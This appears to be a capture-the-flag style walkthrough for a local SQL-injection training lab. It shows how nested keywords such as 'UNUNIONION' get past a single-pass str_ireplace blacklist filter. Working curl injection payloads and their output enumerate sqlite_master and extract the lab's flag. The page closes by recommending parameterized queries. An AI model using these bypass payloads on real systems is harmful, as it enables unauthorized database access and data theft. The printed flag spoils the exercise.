<h4>Step 1: Test Normal Search</h4>
<p>Search for keywords to see the normal application behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=a"<br>
        <span class="prompt">SQL: </span>SELECT id, keyword, description FROM search_data WHERE keyword LIKE '%a%'<br><br>
        <span class="prompt">Output:</span><br>
        id | keyword | description<br>
        3 | authentication | OAuth, JWT, and session management<br>
        4 | firewall | Network security and packet filtering<br>
        5 | malware | Virus, trojan, and ransomware analysis
    </div>
</div>

<h4>Step 2: Observe WAF Blocking</h4>
<p>The WAF strips UNION, SELECT, FROM, WHERE, AND, OR (case-insensitive).</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. WAF in Action</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
        <span class="prompt">WAF Raw:      </span>' UNION SELECT 1,2,3 -- -<br>
        <span class="prompt">WAF Filtered: </span>'   1,2,3 -- -<br>
        <span class="prompt">Error: </span><strong>SQLite Error: near "1": syntax error</strong><br><br>
        <span class="prompt">// UNION and SELECT were completely stripped!</span>
    </div>
</div>

<h4>Step 3: Craft Nested Keywords</h4>
<p>
    <code>str_ireplace()</code> makes only a single pass. Nesting keywords inside themselves
    causes the removal to reconstruct the original keyword.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Nested Keyword Map</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">UNION   -> </span>UN<strong>UNION</strong>ION => removes inner "UNION" => UN + ION = UNION<br>
        <span class="prompt">SELECT  -> </span>SEL<strong>SELECT</strong>ECT => removes inner "SELECT" => SEL + ECT = SELECT<br>
        <span class="prompt">FROM    -> </span>FR<strong>FROM</strong>OM => removes inner "FROM" => FR + OM = FROM<br>
        <span class="prompt">WHERE   -> </span>WH<strong>WHERE</strong>ERE => removes inner "WHERE" => WH + ERE = WHERE<br>
        <span class="prompt">AND     -> </span>A<strong>AND</strong>ND => removes inner "AND" => A + ND = AND<br>
        <span class="prompt">OR      -> </span>O<strong>OR</strong>R => removes inner "OR" => O + R = OR
    </div>
</div>

<h4>Step 4: Test the Bypass</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. WAF Bypass Confirmed</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT 1,2,3 -- -"<br>
        <span class="prompt">WAF Raw:      </span>' UNUNIONION SELSELECTECT 1,2,3 -- -<br>
        <span class="prompt">WAF Filtered: </span>' UNION SELECT 1,2,3 -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | keyword | description<br>
        1 | 2 | 3<br>
        1 | networking | TCP/IP fundamentals and protocols<br>
        2 | encryption | AES, RSA, and modern cryptography<br>
        3 | authentication | OAuth, JWT, and session management<br>
        4 | firewall | Network security and packet filtering<br>
        5 | malware | Virus, trojan, and ransomware analysis<br><br>
        <span class="prompt">// UNION SELECT reconstructed successfully!</span>
    </div>
</div>

<h4>Step 5: Enumerate Tables</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT name, sql, type FRFROMOM sqlite_master -- -"<br><br>
        <span class="prompt">Output:</span><br>
        id | keyword | description<br>
        1 | networking | TCP/IP fundamentals and protocols<br>
        2 | encryption | AES, RSA, and modern cryptography<br>
        3 | authentication | OAuth, JWT, and session management<br>
        4 | firewall | Network security and packet filtering<br>
        5 | malware | Virus, trojan, and ransomware analysis<br>
        <strong>hidden_flags</strong> | CREATE TABLE hidden_flags (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;flag_value TEXT<br>
        ) | table<br>
        search_data | CREATE TABLE search_data (...) | table
    </div>
</div>

<h4>Step 6: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"<br><br>
        <span class="prompt">Output:</span><br>
        id | keyword | description<br>
        1 | <strong>FLAG{sq_w4f_n0_st4nd4rd}</strong> | pwned<br>
        1 | networking | TCP/IP fundamentals and protocols<br>
        2 | encryption | AES, RSA, and modern cryptography<br>
        3 | authentication | OAuth, JWT, and session management<br>
        4 | firewall | Network security and packet filtering<br>
        5 | malware | Virus, trojan, and ransomware analysis
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_w4f_n0_st4nd4rd}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"
    </div>
</div>

<h4>Step 8: Why str_ireplace() Fails</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. WAF Weakness Analysis</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// str_ireplace() processes each keyword in order:</span><br>
        <span class="prompt">// Pass 1 (union): </span>UNUNIONION -> UNION (inner match removed)<br>
        <span class="prompt">// Pass 2 (select): </span>SELSELECTECT -> SELECT (inner match removed)<br>
        <span class="prompt">// Pass 3 (from): </span>FRFROMOM -> FROM (inner match removed)<br><br>
        <span class="prompt">// Single-pass removal = easily bypassed.</span><br>
        <span class="prompt">// Even recursive removal can be bypassed with triple-nesting!</span><br>
        <span class="prompt">// Blacklist WAFs are fundamentally flawed.</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>str_ireplace()</code> makes a single pass: nested keywords
    like <code>UNUNIONION</code> survive as <code>UNION</code> after the inner match is removed.
    Blacklist-based WAFs are fundamentally flawed and cannot account for all bypass techniques
    (nesting, case mixing, comments, encoding, etc.). The only reliable defense is parameterized
    queries (prepared statements). WAFs should be a defense-in-depth layer, never the primary
    security control.
</div>
